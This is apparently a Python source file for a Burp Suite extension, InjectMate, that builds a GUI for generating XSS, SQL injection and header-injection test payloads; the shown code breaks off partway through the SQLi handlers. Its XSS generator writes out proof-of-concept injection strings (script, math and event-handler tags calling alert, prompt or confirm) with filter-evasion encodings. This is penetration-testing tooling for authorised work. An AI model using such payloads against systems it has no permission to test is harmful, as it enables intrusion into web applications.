__author__ = 'Jake Miller (@LaconicWolf)'
__date__ = '20190320'
__version__ = '0.01'
__description__ = """\
Burp Extension that generates payloads for 
XSS, SQLi, and Header injection vulns.
"""

from burp import IBurpExtender, ITab
from javax import swing
from javax.swing.filechooser import FileNameExtensionFilter
from java.awt import BorderLayout, GridLayout, Toolkit
from java.awt.datatransfer import StringSelection
from java.awt.datatransfer import Clipboard
from java.util import ArrayList

import string
import random
import threading
import time
import cgi
import urllib
import re
import sys
import os
try:
    from exceptions_fix import FixBurpExceptions
except ImportError:
    pass

# Set initial configuration. Values correspond with 
# checkboxes and default settings

xssTags = {
    'script': False,
    'button': False,
    'video': False,
    'details': False,
    'math': False,
    'audio': False,
    'img': False,
    'body': False,
    'object': False
}

xssEventHandlers = {
    'onclick': False,
    'onerror': False,
    'onkeypress': False,
    'onmouseover': False,
    'onsubmit': False,
    'ondblclick': False,
    'onmouseenter': False,
    'onscroll': False,
    'onwheel': False
}

xssConfig = {
    "URL encode special chars": False,
    "Replace () with ``": False,
    "Toggle case": False,
    "Upper case": False,
    "HTML encode special chars": False,
    "Append random chars": False,
    "Non-standard percent encoding": False,
    "Non-standard slash encoding": False,
    "Close tags": False
}

sqliDbmsToTest = {
    "MySQL": False,
    "Oracle": False,
    "PostgreSQL": False,
    "Microsoft SQL Server": False,
    "Microsoft Access": False,
    "IBM DB2": False,
    "SQLite": False,
    "Firebird": False,
    "Sybase": False,
    "SAP MaxDB": False,
    "HSQLDB": False,
    "Informix": False,
}

sqliTechniques = {
    "Boolean-based blind": False,
    "Error-based": False,
    "Time-based blind": False,
    "Stacked queries": False
}

sqliConfig = {
    "URL encode special chars": False,
    "Toggle case": False,
    "Lower case": False,
    "Non-standard percent encoding": False,
    "Non-standard slash encoding": False
}

headersToTest = {
    'Authorization': False,
    'Connection': False, 
    'Host': False,
    'HTTP2-Settings': False,
    'Origin': False,
    'Proxy-Authorization': False,
    'Referer': False, 
    'User-Agent': False,
    'X-Forwarded-For': False,
    'X-Forwarded-Host': False, 
    'X-Method-Override': False,
    'X-Wap-Profile': False    
}

headersTests = {
    "Random string reflection": False,
    "Error Invoking Characters": False,
    "Random long strings": False,
    "Out-of-band": False,
}

headersConfig = {
    "Lower case": False,
    "Upper case": False,
    "Toggle case": False,
    "URL encode special chars": False,
    "Non-standard percent encoding": False,
    "Non-standard slash encoding": False
}

# Interact with Burp. Required
class BurpExtender(IBurpExtender, ITab, swing.JFrame):
    def registerExtenderCallbacks(self, callbacks):
        
        # Required for easier debugging: 
        # https://github.com/securityMB/burp-exceptions
        sys.stdout = callbacks.getStdout()

        # Keep a reference to our callbacks object
        self.callbacks = callbacks

        # Set our extension name
        self.callbacks.setExtensionName("InjectMate")

        # Initialize the collaborator
        self.collab = ''
        
        # Create the main tab
        self.tab = swing.JPanel(BorderLayout())

        # Make it have subtabs
        tabbedPane = swing.JTabbedPane()
        self.tab.add(tabbedPane, BorderLayout.CENTER)

        # Subtabs

        # First tab ############ START XSS TAB ############
        firstTab = swing.JPanel()
        firstTab.layout = BorderLayout()
        tabbedPane.addTab("XSS", firstTab)

        tmpGridPanel = swing.JPanel()
        tmpGridPanel.layout = GridLayout(1, 2)

        # Top of XSS Panel
        tmpPanel = swing.JPanel()
        tmpPanel.layout = GridLayout(3, 5)
        tmpPanel.border = swing.BorderFactory.createTitledBorder("Tags to test")
        
        # First row
        tmpPanel.add(swing.JCheckBox("script", False, actionPerformed=self.handleXssTagsSelectCheckBox))
        tmpPanel.add(swing.JCheckBox("details", False, actionPerformed=self.handleXssTagsSelectCheckBox))
        tmpPanel.add(swing.JCheckBox("img", False, actionPerformed=self.handleXssTagsSelectCheckBox))
        tmpPanel.add(swing.JLabel("Custom tag :     ", swing.SwingConstants.RIGHT))
        self.xssCustomTag1Area = swing.JTextField('', 15)
        tmpPanel.add(self.xssCustomTag1Area)
        
        # Second row
        tmpPanel.add(swing.JCheckBox("button", False, actionPerformed=self.handleXssTagsSelectCheckBox))
        tmpPanel.add(swing.JCheckBox("math", False, actionPerformed=self.handleXssTagsSelectCheckBox))
        tmpPanel.add(swing.JCheckBox("body", False, actionPerformed=self.handleXssTagsSelectCheckBox))
        tmpPanel.add(swing.JLabel("Custom tag :     ", swing.SwingConstants.RIGHT))
        self.xssCustomTag2Area = swing.JTextField('', 15)
        tmpPanel.add(self.xssCustomTag2Area)
        
        # Third row
        tmpPanel.add(swing.JCheckBox("video", False, actionPerformed=self.handleXssTagsSelectCheckBox))
        tmpPanel.add(swing.JCheckBox("audio", False, actionPerformed=self.handleXssTagsSelectCheckBox))
        tmpPanel.add(swing.JCheckBox("object", False, actionPerformed=self.handleXssTagsSelectCheckBox))
        tmpPanel.add(swing.JLabel("Custom tag :     ", swing.SwingConstants.RIGHT))
        self.xssCustomTag3Area = swing.JTextField('', 15)
        tmpPanel.add(self.xssCustomTag3Area)

        # Top of XSS Panel
        tmpPanel1 = swing.JPanel()
        tmpPanel1.layout = GridLayout(3, 5)
        tmpPanel1.border = swing.BorderFactory.createTitledBorder("Event Handlers")
     
        # First row
        tmpPanel1.add(swing.JCheckBox("onclick", False, actionPerformed=self.handleXssEventCheckBox))
        tmpPanel1.add(swing.JCheckBox("onmouseover", False, actionPerformed=self.handleXssEventCheckBox))
        tmpPanel1.add(swing.JCheckBox("onmouseenter", False, actionPerformed=self.handleXssEventCheckBox))
        tmpPanel1.add(swing.JLabel("Custom handler :     ", swing.SwingConstants.RIGHT))
        self.xssCustomHandler1Area = swing.JTextField('', 15)
        tmpPanel1.add(self.xssCustomHandler1Area)
        
        # Second row
        tmpPanel1.add(swing.JCheckBox("onerror", False, actionPerformed=self.handleXssEventCheckBox))
        tmpPanel1.add(swing.JCheckBox("onsubmit", False, actionPerformed=self.handleXssEventCheckBox))
        tmpPanel1.add(swing.JCheckBox("onscroll", False, actionPerformed=self.handleXssEventCheckBox))
        tmpPanel1.add(swing.JLabel("Custom handler :     ", swing.SwingConstants.RIGHT))
        self.xssCustomHandler2Area = swing.JTextField('', 15)
        tmpPanel1.add(self.xssCustomHandler2Area)
        
        # Third row
        tmpPanel1.add(swing.JCheckBox("onkeypress", False, actionPerformed=self.handleXssEventCheckBox))
        tmpPanel1.add(swing.JCheckBox("ondblclick", False, actionPerformed=self.handleXssEventCheckBox))
        tmpPanel1.add(swing.JCheckBox("onwheel", False, actionPerformed=self.handleXssEventCheckBox))
        tmpPanel1.add(swing.JLabel("Custom handler :     ", swing.SwingConstants.RIGHT))
        self.xssCustomHandler3Area = swing.JTextField('', 15)
        tmpPanel1.add(self.xssCustomHandler3Area)

        #firstTab.add(tmpPanel, BorderLayout.NORTH)
        tmpGridPanel.add(tmpPanel)
        tmpGridPanel.add(tmpPanel1)
        firstTab.add(tmpGridPanel, BorderLayout.NORTH)

        # Middle of XSS Panel
        tmpPanel = swing.JPanel()
        tmpPanel.layout = BorderLayout()
        tmpPanel.border = swing.BorderFactory.createTitledBorder("Payloads")
        self.xssPayloadTextArea = swing.JTextArea('', 15, 100)
        self.xssPayloadTextArea.setLineWrap(False)
        scrollTextArea = swing.JScrollPane(self.xssPayloadTextArea)
        tmpPanel.add(scrollTextArea)
        firstTab.add(tmpPanel, BorderLayout.CENTER)

        # Right/Middle of XSS Panel
        tmpPanel = swing.JPanel()
        tmpPanel.layout = GridLayout(6,1)
        tmpPanel.border = swing.BorderFactory.createTitledBorder("Output options")
        tmpPanel.add(swing.JButton('Generate Payloads', actionPerformed=self.handleXssButtonClick))
        tmpPanel.add(swing.JButton('Copy Payloads to Clipboard', actionPerformed=self.handleXssButtonClick))
        tmpPanel.add(swing.JButton('Clear Payloads', actionPerformed=self.handleXssButtonClick))
        tmpPanel.add(swing.JButton('Save to File', actionPerformed=self.handleXssButtonClick))
        tmpPanel.add(swing.JLabel(""))
        tmpPanel.add(swing.JLabel(""))
        firstTab.add(tmpPanel, BorderLayout.EAST)

        # Bottom of XSS Panel
        tmpPanel = swing.JPanel()
        tmpPanel.layout = GridLayout(3, 5)
        tmpPanel.border = swing.BorderFactory.createTitledBorder("Config")

        # First row
        tmpPanel.add(swing.JCheckBox("Upper case", False, actionPerformed=self.handleXssConfigCheckBox))
        tmpPanel.add(swing.JCheckBox("Append random chars", False, actionPerformed=self.handleXssConfigCheckBox))
        tmpPanel.add(swing.JCheckBox("Replace () with ``", False, actionPerformed=self.handleXssConfigCheckBox))
        tmpPanel.add(swing.JLabel("Add a prefix :     ", swing.SwingConstants.RIGHT))
        self.xssPrefixArea = swing.JTextField('', 15)
        tmpPanel.add(self.xssPrefixArea)
        
        # Second row
        tmpPanel.add(swing.JCheckBox("URL encode special chars", False, actionPerformed=self.handleXssConfigCheckBox))
        tmpPanel.add(swing.JCheckBox("Toggle case", False, actionPerformed=self.handleXssConfigCheckBox))
        tmpPanel.add(swing.JCheckBox("HTML encode special chars", False, actionPerformed=self.handleXssConfigCheckBox))
        tmpPanel.add(swing.JLabel("Add a suffix :     ", swing.SwingConstants.RIGHT))
        self.xssSuffixArea = swing.JTextField("", 15)
        tmpPanel.add(self.xssSuffixArea)

        # Third row
        tmpPanel.add(swing.JCheckBox("Non-standard percent encoding", False, actionPerformed=self.handleXssConfigCheckBox))
        tmpPanel.add(swing.JCheckBox("Non-standard slash encoding", False, actionPerformed=self.handleXssConfigCheckBox))
        tmpPanel.add(swing.JCheckBox("Close tags", False, actionPerformed=self.handleXssConfigCheckBox))
        tmpPanel.add(swing.JLabel("Add text :     ", swing.SwingConstants.RIGHT))
        self.xssTagTextArea = swing.JTextField('', 15)
        tmpPanel.add(self.xssTagTextArea)   
        
        firstTab.add(tmpPanel, BorderLayout.SOUTH)
        ############ END XSS TAB ############

        # Second tab 
        ############ START SQLi TAB ############
        secondTab = swing.JPanel()
        secondTab.layout = BorderLayout()
        tabbedPane.addTab("SQLi", secondTab)

        tmpGridPanel = swing.JPanel()
        tmpGridPanel.layout = GridLayout(1, 2)

        # Top of SQLi Panel
        tmpPanel = swing.JPanel()
        tmpPanel.layout = GridLayout(3, 5)
        tmpPanel.border = swing.BorderFactory.createTitledBorder("DBMS to test")
        
        # First row
        tmpPanel.add(swing.JCheckBox("MySQL", False, actionPerformed=self.handleSqliDbSelectCheckBox))
        tmpPanel.add(swing.JCheckBox("Oracle", False, actionPerformed=self.handleSqliDbSelectCheckBox))
        tmpPanel.add(swing.JCheckBox("PostgreSQL", False, actionPerformed=self.handleSqliDbSelectCheckBox))
        tmpPanel.add(swing.JCheckBox("Microsoft SQL Server", False, actionPerformed=self.handleSqliDbSelectCheckBox))
        
        # Second row
        tmpPanel.add(swing.JCheckBox("Microsoft Access", False, actionPerformed=self.handleSqliDbSelectCheckBox))
        tmpPanel.add(swing.JCheckBox("IBM DB2", False, actionPerformed=self.handleSqliDbSelectCheckBox))
        tmpPanel.add(swing.JCheckBox("SQLite", False, actionPerformed=self.handleSqliDbSelectCheckBox))
        tmpPanel.add(swing.JCheckBox("Firebird", False, actionPerformed=self.handleSqliDbSelectCheckBox))
        
        # Third row
        tmpPanel.add(swing.JCheckBox("Sybase", False, actionPerformed=self.handleSqliDbSelectCheckBox))
        tmpPanel.add(swing.JCheckBox("SAP MaxDB", False, actionPerformed=self.handleSqliDbSelectCheckBox))
        tmpPanel.add(swing.JCheckBox("HSQLDB", False, actionPerformed=self.handleSqliDbSelectCheckBox))
        tmpPanel.add(swing.JCheckBox("Informix", False, actionPerformed=self.handleSqliDbSelectCheckBox))

        # Top of SQLi Panel
        tmpPanel1 = swing.JPanel()
        tmpPanel1.layout = GridLayout(3, 5)
        tmpPanel1.border = swing.BorderFactory.createTitledBorder("Techniques")
     
        # First row
        tmpPanel1.add(swing.JCheckBox("Boolean-based blind", False, actionPerformed=self.handleSqliTechniquesCheckBox))
        tmpPanel1.add(swing.JCheckBox("Time-based blind", False, actionPerformed=self.handleSqliTechniquesCheckBox))
        tmpPanel1.add(swing.JLabel(""))
        tmpPanel1.add(swing.JLabel(""))
        tmpPanel1.add(swing.JLabel(""))
        
        # Second row
        tmpPanel1.add(swing.JCheckBox("Error-based", False, actionPerformed=self.handleSqliTechniquesCheckBox))
        tmpPanel1.add(swing.JCheckBox("Stacked queries", False, actionPerformed=self.handleSqliTechniquesCheckBox))
        tmpPanel1.add(swing.JLabel(""))
        tmpPanel1.add(swing.JLabel(""))
        
        # Third row
        tmpPanel1.add(swing.JLabel(""))
        tmpPanel1.add(swing.JLabel(""))
        tmpPanel1.add(swing.JLabel(""))
        tmpPanel1.add(swing.JLabel(""))

        #firstTab.add(tmpPanel, BorderLayout.NORTH)
        tmpGridPanel.add(tmpPanel)
        tmpGridPanel.add(tmpPanel1)
        secondTab.add(tmpGridPanel, BorderLayout.NORTH)

        # Middle of SQLi Panel
        tmpPanel = swing.JPanel()
        tmpPanel.layout = BorderLayout()
        tmpPanel.border = swing.BorderFactory.createTitledBorder("Payloads")
        self.sqliPayloadTextArea = swing.JTextArea('', 15, 100)
        self.sqliPayloadTextArea.setLineWrap(False)
        scrollTextArea = swing.JScrollPane(self.sqliPayloadTextArea)
        tmpPanel.add(scrollTextArea)
        secondTab.add(tmpPanel, BorderLayout.CENTER)

        # Right/Middle of SQLi Panel
        tmpPanel = swing.JPanel()
        tmpPanel.layout = GridLayout(6,1)
        tmpPanel.border = swing.BorderFactory.createTitledBorder("Output options")
        tmpPanel.add(swing.JButton('Generate Payloads', actionPerformed=self.handleSqliButtonClick))
        tmpPanel.add(swing.JButton('Copy Payloads to Clipboard', actionPerformed=self.handleSqliButtonClick))
        tmpPanel.add(swing.JButton('Clear Payloads', actionPerformed=self.handleSqliButtonClick))
        tmpPanel.add(swing.JButton('Save to File', actionPerformed=self.handleSqliButtonClick))
        tmpPanel.add(swing.JLabel(""))
        tmpPanel.add(swing.JLabel(""))
        secondTab.add(tmpPanel, BorderLayout.EAST)

        # Bottom of SQLi Panel
        tmpPanel = swing.JPanel()
        tmpPanel.layout = GridLayout(3, 5)
        tmpPanel.border = swing.BorderFactory.createTitledBorder("Config")

        # First row
        tmpPanel.add(swing.JCheckBox("Lower case", False, actionPerformed=self.handleSqliConfigCheckBox))
        tmpPanel.add(swing.JCheckBox("Toggle case", False, actionPerformed=self.handleSqliConfigCheckBox))
        tmpPanel.add(swing.JLabel(""))
        tmpPanel.add(swing.JLabel("Add a prefix :     ", swing.SwingConstants.RIGHT))
        self.sqliPrefixArea = swing.JTextField("", 15)
        tmpPanel.add(self.sqliPrefixArea)
        
        # Second row
        tmpPanel.add(swing.JCheckBox("URL encode special chars", False, actionPerformed=self.handleSqliConfigCheckBox))
        tmpPanel.add(swing.JCheckBox("Non-standard slash encoding", False, actionPerformed=self.handleSqliConfigCheckBox))
        tmpPanel.add(swing.JLabel(""))
        tmpPanel.add(swing.JLabel("Add a suffix :     ", swing.SwingConstants.RIGHT))
        self.sqliSuffixArea = swing.JTextField("", 15)
        tmpPanel.add(self.sqliSuffixArea)

        # Third row
        tmpPanel.add(swing.JCheckBox("Non-standard percent encoding", False, actionPerformed=self.handleSqliConfigCheckBox))
        tmpPanel.add(swing.JCheckBox("Non-standard slash encoding", False, actionPerformed=self.handleSqliConfigCheckBox))
        tmpPanel.add(swing.JLabel(""))
        tmpPanel.add(swing.JLabel("Original parameter value :     ", swing.SwingConstants.RIGHT))
        self.sqliOriginalParamArea = swing.JTextField("", 15)  
        tmpPanel.add(self.sqliOriginalParamArea)

        secondTab.add(tmpPanel, BorderLayout.SOUTH)
        ############ END SQLi TAB ############

        ############ START HEADERS TAB ############
        # Third tab 
        thirdTab = swing.JPanel()
        thirdTab.layout = BorderLayout()
        tabbedPane.addTab("Headers", thirdTab)

        # Top of Headers Panel
        tmpPanel = swing.JPanel()
        tmpPanel.layout = GridLayout(3, 5)
        tmpPanel.border = swing.BorderFactory.createTitledBorder("Headers to test")
        
        # First row
        tmpPanel.add(swing.JCheckBox("Authorization", False, actionPerformed=self.handleHeadersSelectCheckBox))
        tmpPanel.add(swing.JCheckBox("Connection", False, actionPerformed=self.handleHeadersSelectCheckBox))
        tmpPanel.add(swing.JCheckBox("Host", False, actionPerformed=self.handleHeadersSelectCheckBox))
        tmpPanel.add(swing.JCheckBox("HTTP2-Settings", False, actionPerformed=self.handleHeadersSelectCheckBox))
        tmpPanel.add(swing.JLabel("Custom Header :     ", swing.SwingConstants.RIGHT))
        self.customHeader1Area = swing.JTextField("", 15)  
        tmpPanel.add(self.customHeader1Area)
        
        # Second row
        tmpPanel.add(swing.JCheckBox("Origin", False, actionPerformed=self.handleHeadersSelectCheckBox))
        tmpPanel.add(swing.JCheckBox("Proxy-Authorization", False, actionPerformed=self.handleHeadersSelectCheckBox))
        tmpPanel.add(swing.JCheckBox("Referer", False, actionPerformed=self.handleHeadersSelectCheckBox))
        tmpPanel.add(swing.JCheckBox("User-Agent", False, actionPerformed=self.handleHeadersSelectCheckBox))
        tmpPanel.add(swing.JLabel("Custom Header :     ", swing.SwingConstants.RIGHT))
        self.customHeader2Area = swing.JTextField("", 15)  
        tmpPanel.add(self.customHeader2Area)
        
        # Third row
        tmpPanel.add(swing.JCheckBox("X-Forwarded-For", False, actionPerformed=self.handleHeadersSelectCheckBox))
        tmpPanel.add(swing.JCheckBox("X-Forwarded-Host", False, actionPerformed=self.handleHeadersSelectCheckBox))
        tmpPanel.add(swing.JCheckBox("X-Method-Override", False, actionPerformed=self.handleHeadersSelectCheckBox))
        tmpPanel.add(swing.JCheckBox("X-Wap-Profile", False, actionPerformed=self.handleHeadersSelectCheckBox))
        tmpPanel.add(swing.JLabel("Custom Header :     ", swing.SwingConstants.RIGHT))
        self.customHeader3Area = swing.JTextField("", 15)  
        tmpPanel.add(self.customHeader3Area)
        
        thirdTab.add(tmpPanel, BorderLayout.NORTH)

        # Middle of Headers Panel
        tmpPanel = swing.JPanel()
        tmpPanel.layout = BorderLayout()
        tmpPanel.border = swing.BorderFactory.createTitledBorder("Payloads")
        self.headerPayloadTextArea = swing.JTextArea('', 15, 100)
        self.headerPayloadTextArea.setLineWrap(False)
        scrollTextArea = swing.JScrollPane(self.headerPayloadTextArea)
        tmpPanel.add(scrollTextArea)
        thirdTab.add(tmpPanel, BorderLayout.CENTER)

        # Right/Middle of Headers Panel
        tmpPanel = swing.JPanel()
        tmpPanel.layout = GridLayout(6,1)
        tmpPanel.border = swing.BorderFactory.createTitledBorder("Output options")
        tmpPanel.add(swing.JButton('Generate Payloads', actionPerformed=self.handleHeadersButtonClick))
        tmpPanel.add(swing.JButton('Copy Payloads to Clipboard', actionPerformed=self.handleHeadersButtonClick))
        tmpPanel.add(swing.JButton('Clear Payloads', actionPerformed=self.handleHeadersButtonClick))
        tmpPanel.add(swing.JButton('Save to File', actionPerformed=self.handleHeadersButtonClick))
        tmpPanel.add(swing.JButton('Poll Collaborator Server', actionPerformed=self.handleHeadersButtonClick))
        tmpPanel.add(swing.JLabel(""))
        thirdTab.add(tmpPanel, BorderLayout.EAST)

        # Bottom of Headers Panel
        
        # splitting the bottom panel
        tmpGridPanel = swing.JPanel()
        tmpGridPanel.layout = GridLayout(1, 2)
        #

        tmpPanel = swing.JPanel()

        tmpPanel.layout = GridLayout(3, 5)
        tmpPanel.border = swing.BorderFactory.createTitledBorder("Config")
        
        # First row
        tmpPanel.add(swing.JCheckBox("Lower case", False, actionPerformed=self.handleHeadersConfigCheckBox))
        tmpPanel.add(swing.JCheckBox("URL encode special chars", False, actionPerformed=self.handleHeadersConfigCheckBox))
        
        # Second row
        tmpPanel.add(swing.JCheckBox("Upper case", False, actionPerformed=self.handleHeadersConfigCheckBox))
        tmpPanel.add(swing.JCheckBox("Non-standard slash encoding", False, actionPerformed=self.handleHeadersConfigCheckBox))

        # Third row
        tmpPanel.add(swing.JCheckBox("Toggle case", False, actionPerformed=self.handleHeadersConfigCheckBox))
        tmpPanel.add(swing.JCheckBox("Non-standard percent encoding", False, actionPerformed=self.handleHeadersConfigCheckBox))

        tmpPanel1 = swing.JPanel()
        tmpPanel1.layout = GridLayout(3, 5)
        tmpPanel1.border = swing.BorderFactory.createTitledBorder("Tests")
     
        # First row
        tmpPanel1.add(swing.JCheckBox("Error Invoking Characters", False, actionPerformed=self.handleHeadersTestsCheckBox))
        tmpPanel1.add(swing.JCheckBox("Random string reflection", False, actionPerformed=self.handleHeadersTestsCheckBox))
        tmpPanel1.add(swing.JLabel("Custom header value:  ", swing.SwingConstants.RIGHT))
        self.headersCustomValue1Area = swing.JTextField("", 15)  
        tmpPanel1.add(self.headersCustomValue1Area)
        
        # Second row
        tmpPanel1.add(swing.JCheckBox("Out-of-band", False, actionPerformed=self.handleHeadersTestsCheckBox))
        tmpPanel1.add(swing.JCheckBox("Random long strings", False, actionPerformed=self.handleHeadersTestsCheckBox))
        tmpPanel1.add(swing.JLabel("Custom header value:  ", swing.SwingConstants.RIGHT))
        self.headersCustomValue2Area = swing.JTextField("", 15)  
        tmpPanel1.add(self.headersCustomValue2Area)
        
        # Third row
        tmpPanel1.add(swing.JLabel(""))
        tmpPanel1.add(swing.JLabel(""))
        tmpPanel1.add(swing.JLabel("Callback server address:  ", swing.SwingConstants.RIGHT))
        self.headersCallbackAddressArea = swing.JTextField("", 15)  
        tmpPanel1.add(self.headersCallbackAddressArea)

        tmpGridPanel.add(tmpPanel)
        tmpGridPanel.add(tmpPanel1)
        
        thirdTab.add(tmpGridPanel, BorderLayout.SOUTH)
        ############ END HEADERS TAB ############

        ### Originally had 7 tabs...Got rid of 4, 5, and 6. ###

        ####START COLLABORATOR INTERACTIONS TAB####
        # Seventh tab
        seventhTab = swing.JPanel()
        seventhTab.layout = BorderLayout()
        tabbedPane.addTab("Collaborator Log", seventhTab)

        # Text area for Collaborator Interactions Panel
        tmpPanel = swing.JPanel()
        tmpPanel.layout = BorderLayout()
        tmpPanel.border = swing.BorderFactory.createTitledBorder("Collaborator Interactions")
        self.collaboratorInteractionsTextArea = swing.JTextArea('', 15, 100)
        self.collaboratorInteractionsTextArea.setLineWrap(False)
        scrollTextArea = swing.JScrollPane(self.collaboratorInteractionsTextArea)
        tmpPanel.add(scrollTextArea)
        seventhTab.add(tmpPanel, BorderLayout.CENTER)

        # Right/Middle of Collaborator Interactions Panel
        tmpPanel = swing.JPanel()
        tmpPanel.layout = GridLayout(8,1)
        tmpPanel.border = swing.BorderFactory.createTitledBorder("Options")
        tmpPanel.add(swing.JButton('Poll Collaborator Server', actionPerformed=self.handleCollabButtonClick))
        tmpPanel.add(swing.JButton('Copy Interactions to Clipboard', actionPerformed=self.handleCollabButtonClick))
        tmpPanel.add(swing.JButton('Clear Log', actionPerformed=self.handleCollabButtonClick))
        tmpPanel.add(swing.JButton('Save to File', actionPerformed=self.handleCollabButtonClick))
        tmpPanel.add(swing.JLabel(""))
        tmpPanel.add(swing.JLabel(""))
        tmpPanel.add(swing.JLabel(""))
        tmpPanel.add(swing.JLabel(""))
        seventhTab.add(tmpPanel, BorderLayout.EAST)
        #####END COLLABORATOR INTERACTIONS TAB#####

        callbacks.addSuiteTab(self)
        
        # Set up space for save dialogue
        self.savePanel = swing.JPanel()
        self.savePanel.setLayout(BorderLayout())
        
        self.saveArea = swing.JTextArea()
        self.saveArea.setBorder(swing.BorderFactory.createEmptyBorder(10, 10, 10, 10))

        pane = swing.JScrollPane()
        pane.getViewport().add(self.saveArea)

        self.savePanel.setBorder(swing.BorderFactory.createEmptyBorder(10, 10, 10, 10))
        self.savePanel.add(pane)
        self.add(self.savePanel)

        self.setTitle("File chooser")
        self.setSize(300, 250)
        self.setDefaultCloseOperation(swing.JFrame.EXIT_ON_CLOSE)
        self.setLocationRelativeTo(None)
        
        # Provides a place for the save box
        # no need for it to be visible on start
        self.setVisible(False)
        return

    def getTabCaption(self):
        """Return the text to be displayed on the tab"""
        return "InjectMate"
    
    def getUiComponent(self):
        """Passes the UI to burp"""
        return self.tab

    def handleXssTagsSelectCheckBox(self, event):
        """Handles checkbox clicks from the XSS menu 
        selection to ensure only specified payloads  
        are generated.
        """
        if event.source.selected:
            xssTags[event.source.text] = True
        else:
            xssTags[event.source.text] = False

    def handleXssEventCheckBox(self, event):
        """Handles checkbox clicks from the XSS evenk handler menu 
        selection to ensure only specified payloads are generated.
        """
        if event.source.selected:
            xssEventHandlers[event.source.text] = True
        else:
            xssEventHandlers[event.source.text] = False

    def handleXssConfigCheckBox(self, event):
        """Handles checkbox clicks from the XSS menu config 
        selection to ensure only payloads are generated with 
        or without any specified options.
        """
        if event.source.selected:
            xssConfig[event.source.text] = True
        else:
            xssConfig[event.source.text] = False

    def handleXssButtonClick(self, event):
        """Handles button clicks from xss menu."""
        buttonText = event.source.text
        if buttonText == "Generate Payloads":
            self.launchThread(self.generateXssPayloads())
        elif buttonText == "Copy Payloads to Clipboard":
            self.copyToClipboard(self.xssPayloadTextArea.text)
        elif buttonText == 'Clear Payloads':
            self.clearTextArea(self.xssPayloadTextArea)
        elif buttonText == "Save to File":
            self.launchThread(self.saveTextToFile, [self.xssPayloadTextArea])
        else:
            print buttonText

    def generateXssSamplePayload(self):
        """Generates a PoC payload to alert a user."""
        samplePayloads = [
            "prompt({})".format(random.randint(1,1000)), 
            "confirm({})".format(random.randint(1,1000))
        ]
        return samplePayloads[random.randrange(0, 2)]

    def generateXssPayloads(self):
        """Write payloads to the XSS text area"""
        tags = [tag for tag in xssTags if xssTags[tag]]
        handlers = [handler for handler in xssEventHandlers if xssEventHandlers[handler]]
        payloads = []

        if self.xssCustomTag1Area.text:
            tags.append(self.xssCustomTag1Area.text)
        if self.xssCustomTag2Area.text:
            tags.append(self.xssCustomTag2Area.text)
        if self.xssCustomTag3Area.text:
            tags.append(self.xssCustomTag3Area.text)

        if self.xssCustomHandler1Area.text:
            handlers.append(self.xssCustomHandler1Area.text)
        if self.xssCustomHandler2Area.text:
            handlers.append(self.xssCustomHandler2Area.text)
        if self.xssCustomHandler3Area.text:
            handlers.append(self.xssCustomHandler3Area.text) 

        for tag in tags:
            if xssConfig['Upper case']:
                tag = tag.upper()
            if xssConfig['Toggle case']:
                tag = capsEveryOtherChar(tag)
            if tag.lower() == 'script':
                xssSamplePayload = self.generateXssSamplePayload()
                payloads.append("<{0}>{1}</{0}>".format(tag, xssSamplePayload))
                continue
            if tag.lower() == 'math':
                text = self.xssTagTextArea.text if self.xssTagTextArea.text else 'ClickMe'
                payloads.append('<math href="javascript:alert({})">{}</math>'.format(random.randint(1,1000), text))
                payloads.append('<math><maction actiontype="statusline#http://google.com" xlink:href="javascript:alert({})">{}</maction></math>'.format(random.randint(1,1000), text))
                payloads.append('<math><maction actiontype="statusline" xlink:href="javascript:alert({})"><mtext>http://http://google.com</mtext></maction></math>'.format(random.randint(1,1000)))
                continue
            if tag.lower() == 'details':
                xssSamplePayload = self.generateXssSamplePayload()
                payloads.append('<details open ontoggle={}>{}'.format(xssSamplePayload, self.xssTagTextArea.text))
            for handler in handlers:
                xssSamplePayload = self.generateXssSamplePayload()
                if tag.lower() == 'details':
                    if xssConfig['Close tags']:
                        payloads.append("<{0} open {1}={2}>{3}</{0}>".format(tag, handler, xssSamplePayload, self.xssTagTextArea.text))
                    else:
                        payloads.append("<{} open {}={}>{}".format(tag, handler, xssSamplePayload, self.xssTagTextArea.text))
                elif tag.lower() in ['video', 'audio', 'img']:
                    if tag.lower() in ['video', 'audio']:
                        payloads.append("<{0} controls src={3} {1}={2}></{0}>".format(tag, handler, xssSamplePayload, random.randint(1,1000)))
                    else:
                        if xssConfig['Close tags']:
                            payloads.append("<{0} src={3} {1}={2}></{0}>".format(tag, handler, xssSamplePayload, random.randint(1,1000)))
                        else:
                            payloads.append("<{} src={} {}={}>".format(tag, handler, xssSamplePayload, random.randint(1,1000)))
                else:
                    if xssConfig['Close tags']:
                        payloads.append("<{0} {1}={2}>{3}</{0}>".format(tag, handler, xssSamplePayload, self.xssTagTextArea.text))
                    else:
                        payloads.append("<{} {}={}>{}".format(tag, handler, xssSamplePayload, self.xssTagTextArea.text))

        if xssConfig['Replace () with ``']:
            payloads = [payload.replace('(','`').replace(')','`') for payload in payloads]
        if self.xssPrefixArea.text:
            payloads = [self.xssPrefixArea.text + payload for payload in payloads]
        if self.xssSuffixArea.text:
            payloads = [payload + self.xssSuffixArea.text for payload in payloads]
        if xssConfig['Append random chars']:
            payloads = [getRandomString(5) + payload for payload in payloads]
        if xssConfig['Non-standard percent encoding']:
            payloads = [percentNonStandardEncode(payload) for payload in payloads]
        if xssConfig['Non-standard slash encoding']:
            payloads = [slashNonStandardEncode(payload) for payload in payloads]
        if xssConfig['URL encode special chars']:
            payloads = [urlEncode(payload) for payload in payloads]
        if xssConfig['HTML encode special chars']:
            payloads = [cgi.escape(payload) for payload in payloads]

        self.xssPayloadTextArea.text = '\n'.join(payloads)
    
    def handleSqliDbSelectCheckBox(self, event):
        if event.source.selected:
            sqliDbmsToTest[event.source.text] = True
        else:
            sqliDbmsToTest[event.source.text] = False

    def handleSqliTechniquesCheckBox(self, event):
        if event.source.selected:
            sqliTechniques[event.source.text] = True
        else:
            sqliTechniques[event.source.text] = False

    def handleSqliConfigCheckBox(self, event):
        """Handles checkbox clicks from the SQLi menu config 
        selection to ensure only payloads are generated with 
        or without any specified options.
        """
        if event.source.selected:
            sqliConfig[event.source.text] = True
        else:
            sqliConfig[event.source.text] = False

    def handleSqliButtonClick(self, event):
        """Handles button clicks from SQLi menu."""
        buttonText = event.source.text
        if buttonText == "Generate Payloads":
            self.launchThread(self.generateSqliPayloads())
        elif buttonText == "Copy Payloads to Clipboard":
            self.copyToClipboard(self.sqliPayloadTextArea.text)
        elif buttonText == 'Clear Payloads':
            self.clearTextArea(self.sqliPayloadTextArea)
        elif buttonText == "Poll Collaborator Server":
            self.launchThread(self.pollCollabServer())            
        elif buttonText == "Save to File":
